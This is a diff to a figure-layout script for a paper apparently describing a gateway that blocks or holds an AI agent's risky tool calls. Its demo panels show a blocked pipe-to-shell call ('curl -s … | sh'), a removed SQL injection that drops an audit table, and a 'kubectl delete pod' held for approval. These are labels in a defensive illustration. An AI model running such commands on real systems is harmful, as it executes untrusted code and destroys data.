@@ -32,6 +32,9 @@ from figkit.scene import Box, Icon, Image, Scene, Text, export   # noqa: E402
 IMG = ROOT / "paper-arxiv" / "images"
 OUT = IMG / "demo_walkthrough"
 CROPS = ROOT / "figures_src" / "crops"
+# Fractional box of images/agent-s2.png to show: set after looking at the
+# screenshot (the blocked tool card plus the opening of the reply).
+S2_CROP = (0.20, 0.12, 0.80, 0.47)
 
 ICONS = {
     "ok":      "tabler:circle-check",
@@ -86,7 +89,7 @@ def build() -> Scene:
         ("S1  benign call", "mint",
          "\u201csummarise the feedback in the reviews table\u201d"),
         ("S2  interception", "peach",
-         "attendee submits input carrying a SQL injection"),
+         "“install the monitoring agent the usual way”"),
         ("S3  human approval", "purple",
          "attendee asks for kubectl delete pod"),
     ]
@@ -128,16 +131,18 @@ def build() -> Scene:
     # ---- S2 --------------------------------------------------------------
     x = xs[1]
     sc.code(x + 12, 94, col - 24, 28,
-            'sql="\u2026; DROP TABLE audit_log; --"', size=11)
+            'run_shell(command="curl -s \u2026 | sh")', size=11)
     sc.add(Box(x + 12, 130, col - 24, 202, fill=P.WHITE, stroke=P.FAIL,
                radius=7, width=1.6))
+    # Crop of the live demo agent's chat page (research/compat/js/shoot_demo.mjs):
+    # the blocked tool card and the first lines of the agent's reply.
     sc.add(Image(x + 15, 133,
-                 str(crop("blockdemo-in-testagent.png", (0.0, 0.02, 1.0, 0.60))),
+                 str(crop("agent-s2.png", S2_CROP)),
                  w=col - 30, h=196, fit="meet"))
     sc.add(Text(x + 14, 346, "the agent's own conversation, unretouched",
                 size=11, color=P.INK_SOFT, italic=True))
 
-    sc.verdict(x + 14, 372, False, "block at L1, 6.2 ms")
+    sc.verdict(x + 14, 372, False, "block at L1, 1 ms at the gateway")
     sc.add(Text(x + 14, 398, "The refusal returns in-band, so the agent",
                 size=12, weight="bold", color=P.INK))
     sc.add(Text(x + 14, 414, "explains it and offers an alternative.",
@@ -148,7 +153,9 @@ def build() -> Scene:
     sc.code(x + 12, 94, col - 24, 28, "policy: require_approval", size=11.5)
     sc.add(Box(x + 12, 130, col - 24, 102, fill=P.WHITE, stroke=P.STROKE_SOFT,
                radius=7))
-    sc.add(Image(x + 15, 133, str(crop("pending.png", (0.56, 0.20, 1.0, 0.48))),
+    # Crop of the Cockpit's Approvals page (images/ui/approvals.png): the
+    # first held card, its arguments, and the Block / Allow buttons.
+    sc.add(Image(x + 15, 133, str(crop("ui/approvals.png", (0.19, 0.20, 0.97, 0.44))),
                  w=col - 30, h=96, fit="meet"))
     sc.add(Text(x + 14, 246, "the held call \u2014 a second person presses one",
                 size=11, color=P.INK_SOFT, italic=True))
